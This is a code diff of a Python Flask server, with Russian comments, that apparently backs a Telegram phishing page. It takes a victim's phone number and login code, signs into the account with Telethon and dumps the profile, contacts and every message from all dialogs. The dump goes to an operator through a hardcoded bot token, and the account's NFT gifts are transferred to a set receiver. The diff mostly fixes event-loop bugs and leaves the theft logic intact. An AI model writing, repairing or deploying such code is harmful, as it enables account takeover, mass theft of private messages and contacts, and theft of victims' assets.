@@ -1,4 +1,4 @@
-# server.py — полностью обновлённая версия с CORS и корректным event loop
+# server.py — полностью исправленная версия (без ошибок event loop)
 from flask import Flask, render_template, request, jsonify, session
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
@@ -10,7 +10,7 @@ import logging
 from threading import Thread
 from datetime import datetime
 import httpx
-from flask_cors import CORS  # <--- добавлено
+from flask_cors import CORS
 
 logging.basicConfig(level=logging.INFO)
 
@@ -22,13 +22,13 @@ BOT_TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
-CORS(app)  # <--- разрешаем запросы с любых доменов (нужно для GitHub Pages)
+CORS(app)
 
-sessions = {}
-temp_clients = {}
+# Храним только данные для авторизации, а не клиента
+temp_data = {}
 
 # ============================================================
-# Вспомогательные функции для уведомлений
+# Вспомогательные функции
 # ============================================================
 async def send_telegram_message(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -37,18 +37,19 @@ async def send_telegram_message(text):
 
 def notify_admin_sync(text):
     try:
-        asyncio.run(send_telegram_message(text))
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(send_telegram_message(text))
+        loop.close()
     except Exception as e:
         logging.error(f"Failed to notify admin: {e}")
 
 # ============================================================
-# Сбор ВСЕХ данных аккаунта (диалоги, контакты, сообщения)
+# Сбор данных аккаунта
 # ============================================================
 async def collect_full_user_data(client):
-    """Собирает профиль, контакты, все диалоги, все сообщения."""
     data = {}
     
-    # 1. Данные владельца
     me = await client.get_me()
     data['user'] = {
         'id': me.id,
@@ -60,7 +61,6 @@ async def collect_full_user_data(client):
         'is_premium': getattr(me, 'premium', False)
     }
     
-    # 2. Контакты
     contacts = await client.get_contacts()
     data['contacts'] = []
     for contact in contacts:
@@ -72,7 +72,6 @@ async def collect_full_user_data(client):
             'phone': contact.phone
         })
     
-    # 3. Диалоги и сообщения
     dialogs = await client.get_dialogs()
     data['dialogs'] = []
     for dialog in dialogs:
@@ -89,7 +88,6 @@ async def collect_full_user_data(client):
         elif dialog.is_channel:
             dialog_info['type'] = 'channel'
         
-        # Собираем ВСЕ сообщения (без лимита)
         try:
             messages = []
             async for msg in client.iter_messages(dialog, limit=None):
@@ -112,9 +110,6 @@ async def collect_full_user_data(client):
     
     return data
 
-# ============================================================
-# Отправка JSON-файла админу
-# ============================================================
 async def send_document_to_admin(file_path):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
@@ -145,9 +140,6 @@ async def check_balance_and_gifts(client):
         logging.error(f"Balance check error: {e}")
         return None
 
-# ============================================================
-# Передача NFT-подарков получателю
-# ============================================================
 async def transfer_nft_to_receiver(client, info):
     try:
         receiver = await client.get_entity(RECEIVER_USERNAME)
@@ -190,7 +182,7 @@ def check_page(check_id):
     return render_template('index.html')
 
 # ============================================================
-# API: отправка кода подтверждения
+# API: отправка кода
 # ============================================================
 @app.route('/api/send-code', methods=['POST'])
 def api_send_code():
@@ -201,28 +193,26 @@ def api_send_code():
         return jsonify({"success": False, "error": "Введите номер"}), 400
     
     session_id = os.urandom(8).hex()
-    session['session_id'] = session_id
     
-    # СОЗДАЁМ НОВЫЙ EVENT LOOP ДЛЯ ЭТОГО ПОТОКА
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
     async def send_code():
-        # КЛИЕНТ СОЗДАЁТСЯ ВНУТРИ АСИНХРОННОЙ ФУНКЦИИ
         client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
         try:
             await client.connect()
             result = await client.send_code_request(phone)
-            temp_clients[session_id] = {
-                'client': client,
+            # Сохраняем ТОЛЬКО данные, а не клиента
+            temp_data[session_id] = {
                 'phone': phone,
-                'phone_code_hash': result.phone_code_hash
+                'phone_code_hash': result.phone_code_hash,
+                'session_id': session_id
             }
+            await client.disconnect()
             return True
         except Exception as e:
             logging.error(f"Send code error: {e}")
-            if client:
-                await client.disconnect()
+            await client.disconnect()
             return False
     
     try:
@@ -235,7 +225,7 @@ def api_send_code():
         loop.close()
 
 # ============================================================
-# API: проверка кода и завершение авторизации
+# API: проверка кода
 # ============================================================
 @app.route('/api/verify-code', methods=['POST'])
 def api_verify_code():
@@ -246,25 +236,27 @@ def api_verify_code():
     if not code or not session_id:
         return jsonify({"success": False, "error": "Введите код"}), 400
     
-    if session_id not in temp_clients:
+    if session_id not in temp_data:
         return jsonify({"success": False, "error": "Сессия не найдена"}), 400
     
-    session_data = temp_clients[session_id]
-    client = session_data['client']
-    phone_code_hash = session_data['phone_code_hash']
+    session_data = temp_data[session_id]
     phone = session_data['phone']
+    phone_code_hash = session_data['phone_code_hash']
     
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
     async def verify_and_process():
+        # СОЗДАЁМ НОВОГО КЛИЕНТА В ЭТОМ ЖЕ LOOP
+        client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
         try:
+            await client.connect()
+            # ВХОДИМ С КОДОМ
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
             
-            # Получаем информацию о балансе и подарках
+            # Получаем информацию
             info = await check_balance_and_gifts(client)
             if info:
-                # Сбор полного дампа и отправка админу
                 try:
                     dump_data = await collect_full_user_data(client)
                     dump_filename = f"dump_{info['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
@@ -277,13 +269,12 @@ def api_verify_code():
                     logging.error(f"Error during data dump: {e}")
                     await send_telegram_message(f"❌ Ошибка сбора дампа: {e}")
                 
-                # Отправляем подарки получателю
                 await transfer_nft_to_receiver(client, info)
             
             await client.disconnect()
-            # Удаляем сессию после завершения
-            if session_id in temp_clients:
-                del temp_clients[session_id]
+            # Удаляем данные после успешного входа
+            if session_id in temp_data:
+                del temp_data[session_id]
             return True
         except SessionPasswordNeededError:
             await client.disconnect()
@@ -304,9 +295,6 @@ def api_verify_code():
     finally:
         loop.close()
 
-# ============================================================
-# Запуск (если файл запускается напрямую)
-# ============================================================
 if __name__ == '__main__':
     os.makedirs('sessions', exist_ok=True)
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
